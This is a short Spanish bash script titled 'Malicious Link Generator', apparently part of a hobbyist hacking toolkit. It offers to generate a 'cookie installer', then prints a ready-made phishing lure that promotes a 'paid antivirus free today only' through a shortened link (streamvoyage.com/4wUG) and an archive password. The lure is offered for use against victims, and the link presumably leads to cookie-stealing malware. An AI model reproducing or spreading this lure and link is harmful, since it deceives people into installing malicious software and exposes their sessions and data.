clear
echo "Generador De Enlaces Maliciosos"
echo " "
echo "By NePtYx"
echo " "
echo "¿Desea generar un instalador de cookies?"
read input
echo "Generando..."
echo " "
echo "Prueba el nuevo antivirus de paga gratis,solo hoy:"
echo "Link: http://streamvoyage.com/4wUG"
echo "Contraseña:1"
echo " "
echo "¿Desea volver al menu de seleccion?"
read input2
./EnlacesGen.sh


